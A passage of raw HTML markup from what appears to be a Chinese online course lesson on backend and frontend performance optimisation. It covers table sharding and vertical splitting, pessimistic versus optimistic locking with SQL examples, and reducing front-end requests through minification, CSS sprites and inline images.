<span data-slate-object="text" data-key="1075"><span data-slate-leaf="true" data-offset-key="1075:0" 
data-first-offset="true"><span data-slate-string="true">数据库表拆分也是一个很常见的优化方式，这里的拆分分为横向（水平）拆分和纵向（垂直）拆分两种。</span></span></span> 
</div> <div class="se-1a38f955 " data-slate-type="paragraph" data-slate-object="block" data-key="1076"> 
<span data-slate-object="text" data-key="1077"><span data-slate-leaf="true" data-offset-key="1077:0" 
data-first-offset="true"><span class="se-a26c2c9b" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">横向拆分，指的是把业务意义上的同一个表，拆分到不同的数据库节点或不同子表中，也就是说，这些节点中的表结构都是一样的，当然，存储的数据是不一样的。</span></span></span></span> 
</div> <div class="se-61ded8a7 " data-slate-type="paragraph" data-slate-object="block" data-key="1078"> 
<span data-slate-object="text" data-key="1079"><span data-slate-leaf="true" data-offset-key="1079:0" 
data-first-offset="true"><span data-slate-string="true">我们前面介绍过的 Sharding 和 Partitioning 就是属于这一类型。那么，在查询或修改的时候，我们怎么知道数据在哪台机器上呢？</span></span></span> 
</div> <div class="se-10950224 " data-slate-type="paragraph" data-slate-object="block" data-key="1080"> 
<span data-slate-object="text" data-key="1081"><span data-slate-leaf="true" data-offset-key="1081:0" 
data-first-offset="true"><span data-slate-string="true">这就可以根据主键做 hash 映射或者范围映射来找到相应的节点，再继续进行操作了。Hash 
映射本专栏已经介绍过了，而范围映射也很常见，比如用户的交易数据，3 月份的数据一个表，4 月份的数据一个表，这就是使用时间来做范围条件的一个例子。</span></span></span> 
</div> <div class="se-09794791 " data-slate-type="paragraph" data-slate-object="block" data-key="1082"> 
<span data-slate-object="text" data-key="1083"><span data-slate-leaf="true" data-offset-key="1083:0" 
data-first-offset="true"><span class="se-c62cd2b9" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">再来说说垂直拆分，说的是把一个表拆成多个表，甚至拆到多个库中，这时的拆分是按照不同列来进行的，拆分出的表结构是完全不一样的，表和表之间通常使用外键关联。</span></span></span></span><span 
data-slate-object="text" data-key="1084"><span data-slate-leaf="true" data-offset-key="1084:0" 
data-first-offset="true"><span data-slate-string="true">比如有这样一个文件表：</span></span></span> </div> 
<div class="se-2398056c" data-slate-type="image" data-slate-object="block" data-key="1085"> 
<img class="se-4be23076" src="https://static001.geekbang.org/resource/image/c9/2d/c91431880c44619198a143488ef15a2d.jpg"> 
</div> <div class="se-13c01575 " data-slate-type="paragraph" data-slate-object="block" data-key="1086"> 
<span data-slate-object="text" data-key="1087"><span data-slate-leaf="true" data-offset-key="1087:0" 
data-first-offset="true"><span data-slate-string="true">各列分别为：唯一 ID、标题、创建日期、描述，以及以 BLOB 格式存储的文件具体内容（CONTENT）。</span></span></span> 
</div> <div class="se-689a2d7d " data-slate-type="paragraph" data-slate-object="block" data-key="1088"> 
<span data-slate-object="text" data-key="1089"><span data-slate-leaf="true" data-offset-key="1089:0" 
data-first-offset="true"><span data-slate-string="true">在这种情况下，如果执行全表扫描的查询，在文件非常大且记录数非常多的情况下，执行的过程会非常慢。这是因为一般的关系数据库是行数据库，数据是一行一行读取的（关于行数据库和列数据库的区别和原理，你可以回看 
</span></span></span><a data-slate-type="link" data-slate-object="inline" data-key="1090" class="se-bd361ee3 
se-f81bfce9"><span data-slate-object="text" data-key="1091"><span data-slate-leaf="true" data-offset-key="1091:0" 
data-first-offset="true"><span data-slate-string="true">[第 25 讲]</span></span></span></a><span 
data-slate-object="text" data-key="1092"><span data-slate-leaf="true" data-offset-key="1092:0" 
data-first-offset="true"><span data-slate-string="true">），磁盘一次读取一块，这一块内包含若干行。那么由于 CONTENT 列往往非常大，每次读取只能读到非常少的行，因此需要读取很多次才能完成全表扫描。这种情况下，我们就可以做这样的拆表优化，把这个表拆成如下两个：</span></span></span> 
</div> <div class="se-9f7b9f83" data-slate-type="image" data-slate-object="block" data-key="1093"> 
<img class="se-e32ab2d7" src="https://static001.geekbang.org/resource/image/5b/8d/5b2e4b69ea8981ead2938ed27de43f8d.jpg"> 
</div> <div class="se-f55d0fd4" data-slate-type="image" data-slate-object="block" data-key="1094"> 
<img class="se-74c920ba" src="https://static001.geekbang.org/resource/image/06/9d/06d16222996df1acba163cace9b9889d.jpg"> 
</div> <div class="se-6ac3375a " data-slate-type="paragraph" data-slate-object="block" data-key="1095"> 
<span data-slate-object="text" data-key="1096"><span data-slate-leaf="true" data-offset-key="1096:0" 
data-first-offset="true"><span data-slate-string="true">你看，第一个表一下子就瘦身下来了，这个表没有了那个最大的 BLOB 对象组成的列，在全表扫描进行查询的时候，就可以比较快地进行，而当找到了相应的 
ID 并需要取出 CONTENT 的时候，再根据 ID 到第二个表里面去查询出具体需要的文件来。</span></span></span> </div> <div class="se-919599de 
" data-slate-type="paragraph" data-slate-object="block" data-key="1097"> <span data-slate-object="text" 
data-key="1098"><span data-slate-leaf="true" data-offset-key="1098:0" data-first-offset="true"><span 
data-slate-string="true">你可能注意到了，这种优化的动机和前提有这样两个：</span></span></span> </div> <div class="se-7dd67ba5" 
data-slate-type="list" data-slate-object="block" data-key="1099"> <div class="se-ac863ee7 se-dfe94fbf" 
data-slate-type="list-line" data-slate-object="block" data-key="1100"> <span data-slate-object="text" 
data-key="1101"><span data-slate-leaf="true" data-offset-key="1101:0" data-first-offset="true"><span 
class="se-6f964d38" data-slate-type="bold" data-slate-object="mark"><span data-slate-string="true">查询无法单纯地走索引完成，而需要进行全表扫描或部分表扫描；</span></span></span></span> 
</div> <div class="se-da745e8c se-d151dad6" data-slate-type="list-line" data-slate-object="block" 
data-key="1102"> <span data-slate-object="text" data-key="1103"><span data-slate-leaf="true" 
data-offset-key="1103:0" data-first-offset="true"><span class="se-5fcbc8d8" data-slate-type="bold" 
data-slate-object="mark"><span data-slate-string="true">某列或某几列占用空间巨大，而它们却并不需要参与关系查询。</span></span></span></span> 
</div> </div> <div class="se-b040f814 " data-slate-type="paragraph" data-slate-object="block" 
data-key="1104"> <span data-slate-object="text" data-key="1105"><span data-slate-leaf="true" 
data-offset-key="1105:0" data-first-offset="true"><span data-slate-string="true">当这两个条件都符合的时候，我们就可以考虑垂直拆分（纵向拆表）了。</span></span></span> 
</div> <h3 class="se-e6437723" data-slate-type="heading" data-slate-object="block" data-key="1106"><span 
data-slate-object="text" data-key="1107"><span data-slate-leaf="true" data-offset-key="1107:0" 
data-first-offset="true"><span data-slate-string="true">4. 悲观锁变乐观锁</span></span></span></h3> 
<div class="se-d040895a " data-slate-type="paragraph" data-slate-object="block" data-key="1108"> 
<span data-slate-object="text" data-key="1109"><span data-slate-leaf="true" data-offset-key="1109:0" 
data-first-offset="true"><span data-slate-string="true">在关系数据库中，如果我们提到了“锁”，就意味着我们想让数据库某条数据的写操作变得“安全”，换言之，当我们需要根据某些条件而对数据进行更改的时候，不会受到并发的其它写操作的影响，而丧失正确性或完整性。在使用“锁”来实现的时候，有悲观锁和乐观锁两种实现。</span></span></span> 
</div> <div class="se-f27e4a48 " data-slate-type="paragraph" data-slate-object="block" data-key="1110"> 
<span data-slate-object="text" data-key="1111"><span data-slate-leaf="true" data-offset-key="1111:0" 
data-first-offset="true"><span data-slate-string="true">所谓悲观锁（Pessimistic Locking），指的是数据库从“最坏”的角度考虑，所以它会先使用排它锁锁定相应的行，进行相应的读判断和写操作，一旦成功了，再提交变更并释放锁资源。</span></span></span><span 
data-slate-object="text" data-key="1112"><span data-slate-leaf="true" data-offset-key="1112:0" 
data-first-offset="true"><span class="se-cc3f7073" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">在使用悲观锁锁定相应行的过程中，如果有其它的写操作，是无法同时进行的，而只能等待。</span></span></span></span><span 
data-slate-object="text" data-key="1113"><span data-slate-leaf="true" data-offset-key="1113:0" 
data-first-offset="true"><span data-slate-string="true">且看这样一组基于 SQL 的例子，它用于将用户的积分更新：</span></span></span> 
</div> <div class="se-deebbcd6 se-b7489931" data-slate-type="pre" data-slate-object="block" 
data-key="1114" data-code-language="sql"> <div class="se-116c8e97 se-e52d59bb"> <span></span> 
</div> <div class="se-6ec5c4c2"> <div class="se-36dff955 se-de48f225" data-code-line-number="1"></div> 
<div class="se-36dff955 se-de48f225" data-code-line-number="2"></div> <div class="se-36dff955 
se-de48f225" data-code-line-number="3"></div> </div> <div class="se-b8509798 ps ps--active-x"> 
<div class="se-d15b7025 se-7e1f828d" data-slate-type="code-line" data-slate-object="block" 
data-key="1115"> <span data-slate-object="text" data-key="1116"><span data-slate-leaf="true" 
data-offset-key="1116:0" data-first-offset="true"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_1090451220" data-annotation-type="annotation"><span data-slate-string="true">select</span></span></span><span 
data-slate-leaf="true" data-offset-key="1116:1"><span data-slate-string="true"> POINTS </span></span><span 
data-slate-leaf="true" data-offset-key="1116:2"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_2744396522" data-annotation-type="annotation"><span data-slate-string="true">from</span></span></span><span 
data-slate-leaf="true" data-offset-key="1116:3"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1116:4"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_8837943979" data-annotation-type="annotation"><span data-slate-string="true">USERS</span></span></span><span 
data-slate-leaf="true" data-offset-key="1116:5"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1116:6"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_7463191865" data-annotation-type="annotation"><span data-slate-string="true">where</span></span></span><span 
data-slate-leaf="true" data-offset-key="1116:7"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1116:8"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_0986038215" data-annotation-type="annotation"><span data-slate-string="true">ID</span></span></span><span 
data-slate-leaf="true" data-offset-key="1116:9"><span data-slate-string="true">=</span></span><span 
data-slate-leaf="true" data-offset-key="1116:10"><span class=" gkhl-number" data-slate-object="annotation" 
data-annotation-key="gkann_7992126619" data-annotation-type="annotation"><span data-slate-string="true">1001</span></span></span><span 
data-slate-leaf="true" data-offset-key="1116:11"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1116:12"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_3063853232" data-annotation-type="annotation"><span data-slate-string="true">for</span></span></span><span 
data-slate-leaf="true" data-offset-key="1116:13"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1116:14"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_3417795664" data-annotation-type="annotation"><span data-slate-string="true">update</span></span></span><span 
data-slate-leaf="true" data-offset-key="1116:15"><span data-slate-string="true">;</span></span></span> 
</div> <div class="se-d15b7025 se-7e1f828d" data-slate-type="code-line" data-slate-object="block" 
data-key="1117"> <span data-slate-object="text" data-key="1118"><span data-slate-leaf="true" 
data-offset-key="1118:0" data-first-offset="true"><span data-slate-string="true">... (省略，计算得出积分需要变更为 
123)</span></span></span> </div> <div class="se-d15b7025 se-7e1f828d" data-slate-type="code-line" 
data-slate-object="block" data-key="1119"> <span data-slate-object="text" data-key="1120"><span 
data-slate-leaf="true" data-offset-key="1120:0" data-first-offset="true"><span class=" gkhl-keyword" 
data-slate-object="annotation" data-annotation-key="gkann_7602693840" data-annotation-type="annotation"><span 
data-slate-string="true">update</span></span></span><span data-slate-leaf="true" data-offset-key="1120:1"><span 
data-slate-string="true"> </span></span><span data-slate-leaf="true" data-offset-key="1120:2"><span 
class=" gkhl-keyword" data-slate-object="annotation" data-annotation-key="gkann_7701944229" 
data-annotation-type="annotation"><span data-slate-string="true">USERS</span></span></span><span 
data-slate-leaf="true" data-offset-key="1120:3"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1120:4"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_7943975505" data-annotation-type="annotation"><span data-slate-string="true">set</span></span></span><span 
data-slate-leaf="true" data-offset-key="1120:5"><span data-slate-string="true"> POINTS=</span></span><span 
data-slate-leaf="true" data-offset-key="1120:6"><span class=" gkhl-number" data-slate-object="annotation" 
data-annotation-key="gkann_6649006453" data-annotation-type="annotation"><span data-slate-string="true">123</span></span></span><span 
data-slate-leaf="true" data-offset-key="1120:7"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1120:8"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_8113472397" data-annotation-type="annotation"><span data-slate-string="true">where</span></span></span><span 
data-slate-leaf="true" data-offset-key="1120:9"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1120:10"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_4985712302" data-annotation-type="annotation"><span data-slate-string="true">ID</span></span></span><span 
data-slate-leaf="true" data-offset-key="1120:11"><span data-slate-string="true">=</span></span><span 
data-slate-leaf="true" data-offset-key="1120:12"><span class=" gkhl-number" data-slate-object="annotation" 
data-annotation-key="gkann_2368717687" data-annotation-type="annotation"><span data-slate-string="true">1001</span></span></span><span 
data-slate-leaf="true" data-offset-key="1120:13"><span data-slate-string="true">;</span></span></span> 
</div> <div class="ps__rail-x" style="width: 365px; left: 0px; bottom: 0px;"> <div class="ps__thumb-x" 
tabindex="0" style="left: 0px; width: 341px;"></div> </div> <div class="ps__rail-y" style="top: 
0px; right: 0px;"> <div class="ps__thumb-y" tabindex="0" style="top: 0px; height: 0px;"></div> 
</div> </div> </div> <div class="se-0c9968de " data-slate-type="paragraph" data-slate-object="block" 
data-key="1121"> <span data-slate-object="text" data-key="1122"><span data-slate-leaf="true" 
data-offset-key="1122:0" data-first-offset="true"><span data-slate-string="true">我来简单做个说明：</span></span></span> 
</div> <div class="se-3b0b426a" data-slate-type="list" data-slate-object="block" data-key="1123"> 
<div class="se-c902f62c se-1a190d8a" data-slate-type="list-line" data-slate-object="block" 
data-key="1124"> <span data-slate-object="text" data-key="1125"><span data-slate-leaf="true" 
data-offset-key="1125:0" data-first-offset="true"><span data-slate-string="true">第一行，使用 “for 
update” 这个技巧来锁定 ID 为 1001 的记录，查询出当前的积分；</span></span></span> </div> <div class="se-d234d8b7 
se-99ee6293" data-slate-type="list-line" data-slate-object="block" data-key="1126"> <span data-slate-object="text" 
data-key="1127"><span data-slate-leaf="true" data-offset-key="1127:0" data-first-offset="true"><span 
data-slate-string="true">第二行，业务逻辑得到积分需要如何变更，假如说得出的结果是积分需要变更为 123；</span></span></span> </div> 
<div class="se-001f1a80 se-ba80edcc" data-slate-type="list-line" data-slate-object="block" 
data-key="1128"> <span data-slate-object="text" data-key="1129"><span data-slate-leaf="true" 
data-offset-key="1129:0" data-first-offset="true"><span data-slate-string="true">第三行，执行积分变更（这里假设事务在 
update 之后是配置为自动提交的）；</span></span></span> </div> </div> <div class="se-9e4c2ee6 " data-slate-type="paragraph" 
data-slate-object="block" data-key="1130"> <span data-slate-object="text" data-key="1131"><span 
data-slate-leaf="true" data-offset-key="1131:0" data-first-offset="true"><span data-slate-string="true">这样一来，如果有两条请求同时想执行以上逻辑，那么第一条请求可以执行成功，而第二条会一直等在那里，直到第一条执行完成，它再去执行。这种方式就保证了锁机制的有效性。</span></span></span> 
</div> <div class="se-04b230d3 " data-slate-type="paragraph" data-slate-object="block" data-key="1132"> 
<span data-slate-object="text" data-key="1133"><span data-slate-leaf="true" data-offset-key="1133:0" 
data-first-offset="true"><span data-slate-string="true">下面再来说说乐观锁（Optimistic Locking）。它和悲观锁正好相反，这种情况假定“大多数”的操作发生锁冲突的概率较小，使用一个当前版本号，来表示当前记录的版本。</span></span></span><span 
data-slate-object="text" data-key="1134"><span data-slate-leaf="true" data-offset-key="1134:0" 
data-first-offset="true"><span class="se-4a535c44" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">乐观锁方式下，不需要使用显示的加锁、提交这样的操作，但缺点是一旦发生冲突，整个过程要重来。</span></span></span></span><span 
data-slate-object="text" data-key="1135"><span data-slate-leaf="true" data-offset-key="1135:0" 
data-first-offset="true"><span data-slate-string="true">我们可以把前面的步骤变成下面这样：</span></span></span> 
</div> <div class="se-42dfc74e se-d0741971" data-slate-type="pre" data-slate-object="block" 
data-key="1136" data-code-language="sql"> <div class="se-ce96332d se-07af021a"> <span></span> 
</div> <div class="se-57023fc9"> <div class="se-67b51e57 se-118d254d" data-code-line-number="1"></div> 
<div class="se-67b51e57 se-118d254d" data-code-line-number="2"></div> <div class="se-67b51e57 
se-118d254d" data-code-line-number="3"></div> </div> <div class="se-17710f30 ps ps--active-x"> 
<div class="se-d15b7025 se-7e1f828d" data-slate-type="code-line" data-slate-object="block" 
data-key="1137"> <span data-slate-object="text" data-key="1138"><span data-slate-leaf="true" 
data-offset-key="1138:0" data-first-offset="true"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_3860325070" data-annotation-type="annotation"><span data-slate-string="true">select</span></span></span><span 
data-slate-leaf="true" data-offset-key="1138:1"><span data-slate-string="true"> POINTS, </span></span><span 
data-slate-leaf="true" data-offset-key="1138:2"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_8186464124" data-annotation-type="annotation"><span data-slate-string="true">VERSION</span></span></span><span 
data-slate-leaf="true" data-offset-key="1138:3"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1138:4"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_3197327694" data-annotation-type="annotation"><span data-slate-string="true">from</span></span></span><span 
data-slate-leaf="true" data-offset-key="1138:5"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1138:6"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_8563781119" data-annotation-type="annotation"><span data-slate-string="true">USERS</span></span></span><span 
data-slate-leaf="true" data-offset-key="1138:7"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1138:8"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_4290485284" data-annotation-type="annotation"><span data-slate-string="true">where</span></span></span><span 
data-slate-leaf="true" data-offset-key="1138:9"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1138:10"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_6544410952" data-annotation-type="annotation"><span data-slate-string="true">ID</span></span></span><span 
data-slate-leaf="true" data-offset-key="1138:11"><span data-slate-string="true">=</span></span><span 
data-slate-leaf="true" data-offset-key="1138:12"><span class=" gkhl-number" data-slate-object="annotation" 
data-annotation-key="gkann_4999598592" data-annotation-type="annotation"><span data-slate-string="true">1001</span></span></span><span 
data-slate-leaf="true" data-offset-key="1138:13"><span data-slate-string="true">;</span></span></span> 
</div> <div class="se-d15b7025 se-7e1f828d" data-slate-type="code-line" data-slate-object="block" 
data-key="1139"> <span data-slate-object="text" data-key="1140"><span data-slate-leaf="true" 
data-offset-key="1140:0" data-first-offset="true"><span data-slate-string="true">... (省略，计算得出积分需要变更为 
123)</span></span></span> </div> <div class="se-d15b7025 se-7e1f828d" data-slate-type="code-line" 
data-slate-object="block" data-key="1141"> <span data-slate-object="text" data-key="1142"><span 
data-slate-leaf="true" data-offset-key="1142:0" data-first-offset="true"><span class=" gkhl-keyword" 
data-slate-object="annotation" data-annotation-key="gkann_9209360976" data-annotation-type="annotation"><span 
data-slate-string="true">update</span></span></span><span data-slate-leaf="true" data-offset-key="1142:1"><span 
data-slate-string="true"> </span></span><span data-slate-leaf="true" data-offset-key="1142:2"><span 
class=" gkhl-keyword" data-slate-object="annotation" data-annotation-key="gkann_0112109973" 
data-annotation-type="annotation"><span data-slate-string="true">USERS</span></span></span><span 
data-slate-leaf="true" data-offset-key="1142:3"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1142:4"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_2415081140" data-annotation-type="annotation"><span data-slate-string="true">set</span></span></span><span 
data-slate-leaf="true" data-offset-key="1142:5"><span data-slate-string="true"> POINTS=</span></span><span 
data-slate-leaf="true" data-offset-key="1142:6"><span class=" gkhl-number" data-slate-object="annotation" 
data-annotation-key="gkann_8787399330" data-annotation-type="annotation"><span data-slate-string="true">123</span></span></span><span 
data-slate-leaf="true" data-offset-key="1142:7"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1142:8"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_5171732128" data-annotation-type="annotation"><span data-slate-string="true">and</span></span></span><span 
data-slate-leaf="true" data-offset-key="1142:9"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1142:10"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_9742230892" data-annotation-type="annotation"><span data-slate-string="true">VERSION</span></span></span><span 
data-slate-leaf="true" data-offset-key="1142:11"><span data-slate-string="true">=</span></span><span 
data-slate-leaf="true" data-offset-key="1142:12"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_8173673891" data-annotation-type="annotation"><span data-slate-string="true">VERSION</span></span></span><span 
data-slate-leaf="true" data-offset-key="1142:13"><span data-slate-string="true">+</span></span><span 
data-slate-leaf="true" data-offset-key="1142:14"><span class=" gkhl-number" data-slate-object="annotation" 
data-annotation-key="gkann_6131484861" data-annotation-type="annotation"><span data-slate-string="true">1</span></span></span><span 
data-slate-leaf="true" data-offset-key="1142:15"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1142:16"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_0487444689" data-annotation-type="annotation"><span data-slate-string="true">where</span></span></span><span 
data-slate-leaf="true" data-offset-key="1142:17"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1142:18"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_7382752392" data-annotation-type="annotation"><span data-slate-string="true">ID</span></span></span><span 
data-slate-leaf="true" data-offset-key="1142:19"><span data-slate-string="true">=</span></span><span 
data-slate-leaf="true" data-offset-key="1142:20"><span class=" gkhl-number" data-slate-object="annotation" 
data-annotation-key="gkann_1438655303" data-annotation-type="annotation"><span data-slate-string="true">1001</span></span></span><span 
data-slate-leaf="true" data-offset-key="1142:21"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1142:22"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_4457229452" data-annotation-type="annotation"><span data-slate-string="true">and</span></span></span><span 
data-slate-leaf="true" data-offset-key="1142:23"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1142:24"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_9525514001" data-annotation-type="annotation"><span data-slate-string="true">VERSION</span></span></span><span 
data-slate-leaf="true" data-offset-key="1142:25"><span data-slate-string="true">=</span></span><span 
data-slate-leaf="true" data-offset-key="1142:26"><span class=" gkhl-number" data-slate-object="annotation" 
data-annotation-key="gkann_1675551321" data-annotation-type="annotation"><span data-slate-string="true">1</span></span></span><span 
data-slate-leaf="true" data-offset-key="1142:27"><span data-slate-string="true">;</span></span></span> 
</div> <div class="ps__rail-x" style="width: 365px; left: 0px; bottom: 0px;"> <div class="ps__thumb-x" 
tabindex="0" style="left: 0px; width: 219px;"></div> </div> <div class="ps__rail-y" style="top: 
0px; right: 0px;"> <div class="ps__thumb-y" tabindex="0" style="top: 0px; height: 0px;"></div> 
</div> </div> </div> <div class="se-853b7469" data-slate-type="list" data-slate-object="block" 
data-key="1143"> <div class="se-5641c63b se-9fc7f328" data-slate-type="list-line" data-slate-object="block" 
data-key="1144"> <span data-slate-object="text" data-key="1145"><span data-slate-leaf="true" 
data-offset-key="1145:0" data-first-offset="true"><span data-slate-string="true">第一行，在读取积分的时候，也一并读取到了当前的版本号，假设版本号是 
1；</span></span></span> </div> <div class="se-f1625929 se-cb1f2474" data-slate-type="list-line" 
data-slate-object="block" data-key="1146"> <span data-slate-object="text" data-key="1147"><span 
data-slate-leaf="true" data-offset-key="1147:0" data-first-offset="true"><span data-slate-string="true">第二行，业务逻辑得到积分需要如何变更，假如说得出的结果是积分需要变更为 
123；</span></span></span> </div> <div class="se-adc9b24f se-0ebfbfcf" data-slate-type="list-line" 
data-slate-object="block" data-key="1148"> <span data-slate-object="text" data-key="1149"><span 
data-slate-leaf="true" data-offset-key="1149:0" data-first-offset="true"><span data-slate-string="true">第三行，更新积分为 
123 并自增版本号，但是条件是版本号为 1。之后需要检测这条 update 语句影响的代码行数：如果影响的行数为 1，说明更新成功，程序结束；如果影响的行数为 0，说明在第一行读取数据以后，记录发生了变更，需要重新执行整个过程。</span></span></span> 
</div> </div> <div class="se-ce765887 " data-slate-type="paragraph" data-slate-object="block" 
data-key="1150"> <span data-slate-object="text" data-key="1151"><span data-slate-leaf="true" 
data-offset-key="1151:0" data-first-offset="true"><span data-slate-string="true">还有许许多多其它的后端和持久层的优化通用技术，这里就不展开了。比如缓存的应用，互联网应用有句话叫做“缓存为王”，缓存的本质就是空间换时间，在 
</span></span></span><a data-slate-type="link" data-slate-object="inline" data-key="1152" class="se-bd361ee3 
se-f81bfce9"><span data-slate-object="text" data-key="1153"><span data-slate-leaf="true" data-offset-key="1153:0" 
data-first-offset="true"><span data-slate-string="true">[第 21 讲]</span></span></span></a><span 
data-slate-object="text" data-key="1154"><span data-slate-leaf="true" data-offset-key="1154:0" 
data-first-offset="true"><span data-slate-string="true"> 中我们曾经仔细聊过这部分的内容。再比如，应用之外，我们还经常需要从应用宿主和操作系统等角度来考虑，对于这部分，我在扩展阅读中我给出了一些材料供你阅读。</span></span></span> 
</div> <h2 class="se-3dc28475" data-slate-type="heading" data-slate-object="block" data-key="1155"><span 
data-slate-object="text" data-key="1156"><span data-slate-leaf="true" data-offset-key="1156:0" 
data-first-offset="true"><span data-slate-string="true">前端和网络层优化</span></span></span></h2> 
<div class="se-c6f86feb " data-slate-type="paragraph" data-slate-object="block" data-key="1157"> 
<span data-slate-object="text" data-key="1158"><span data-slate-leaf="true" data-offset-key="1158:0" 
data-first-offset="true"><span data-slate-string="true">当我们思考前端优化的时候，和后端一样，我们可以考虑连接、下载、解析、加载、渲染等等整个过程，先从大局上对整个时间消耗的分布有一个把握，下图来自</span></span></span><a 
data-slate-type="link" data-slate-object="inline" data-key="1159" class="se-bd361ee3 se-f81bfce9"><span 
data-slate-object="text" data-key="1160"><span data-slate-leaf="true" data-offset-key="1160:0" 
data-first-offset="true"><span data-slate-string="true">这篇</span></span></span></a><span data-slate-object="text" 
data-key="1161"><span data-slate-leaf="true" data-offset-key="1161:0" data-first-offset="true"><span 
data-slate-string="true">文章。</span></span></span> </div> <div class="se-41aea8be" data-slate-type="image" 
data-slate-object="block" data-key="1162"> <img class="se-77844b36" src="https://static001.geekbang.org/resource/image/73/91/7321dc1c3cc44bc7a15b1efaf2e92391.jpeg"> 
</div> <h3 class="se-29a9e72c" data-slate-type="heading" data-slate-object="block" data-key="1163"><span 
data-slate-object="text" data-key="1164"><span data-slate-leaf="true" data-offset-key="1164:0" 
data-first-offset="true"><span data-slate-string="true">1. 减少请求次数</span></span></span></h3> 
<div class="se-5136cc8a " data-slate-type="paragraph" data-slate-object="block" data-key="1165"> 
<span data-slate-object="text" data-key="1166"><span data-slate-leaf="true" data-offset-key="1166:0" 
data-first-offset="true"><span data-slate-string="true">这是进行许多前端优化的共同目标之一，有不少全栈工程师日常在进行的实践，都遵循了这一条原则。</span></span></span> 
</div> <div class="se-96733e5c" data-slate-type="list" data-slate-object="block" data-key="1167"> 
<div class="se-f90bb044 se-be2cfb51" data-slate-type="list-line" data-slate-object="block" 
data-key="1168"> <span data-slate-object="text" data-key="1169"><span data-slate-leaf="true" 
data-offset-key="1169:0" data-first-offset="true"><span data-slate-string="true">文本资源：CSS 压缩、JavaScript 
压缩。有两个静态资源的后期处理方式我们经常结合起来使用，一个是压缩，一个是混淆。前者将多个文件压缩成一个，目的是减少大小，而更重要的是减少请求数；后者则是将变量使用无意义的名称替代，目的就是让产品代码“难懂”，减少代码实际意义的泄露。</span></span></span> 
</div> <div class="se-0b2eb1ca se-85f80ca0" data-slate-type="list-line" data-slate-object="block" 
data-key="1170"> <span data-slate-object="text" data-key="1171"><span data-slate-leaf="true" 
data-offset-key="1171:0" data-first-offset="true"><span data-slate-string="true">图像资源：</span></span></span><a 
data-slate-type="link" data-slate-object="inline" data-key="1172" class="se-bd361ee3 se-f81bfce9"><span 
data-slate-object="text" data-key="1173"><span data-slate-leaf="true" data-offset-key="1173:0" 
data-first-offset="true"><span data-slate-string="true">CSS Sprites</span></span></span></a><span 
data-slate-object="text" data-key="1174"><span data-slate-leaf="true" data-offset-key="1174:0" 
data-first-offset="true"><span data-slate-string="true"> 和 </span></span></span><a data-slate-type="link" 
data-slate-object="inline" data-key="1175" class="se-bd361ee3 se-f81bfce9"><span data-slate-object="text" 
data-key="1176"><span data-slate-leaf="true" data-offset-key="1176:0" data-first-offset="true"><span 
data-slate-string="true">Inline Image</span></span></span></a><span data-slate-object="text" 
data-key="1177"><span data-slate-leaf="true" data-offset-key="1177:0" data-first-offset="true"><span 
data-slate-string="true">。前者又叫做雪碧图、精灵图，是将网站所用的多张图片拼成一张，这样多张图片只需要下载一次，而使用 CSS 中的 background-image 
和 background-position 在目标位置选择显示哪一张图片。后者则是干脆将二进制的图片使用 Base64 算法序列化成文本，直接嵌入在原始页面上。</span></span></span> 
</div> <div class="se-ea000f70 se-2a05ff04" data-slate-type="list-line" data-slate-object="block" 
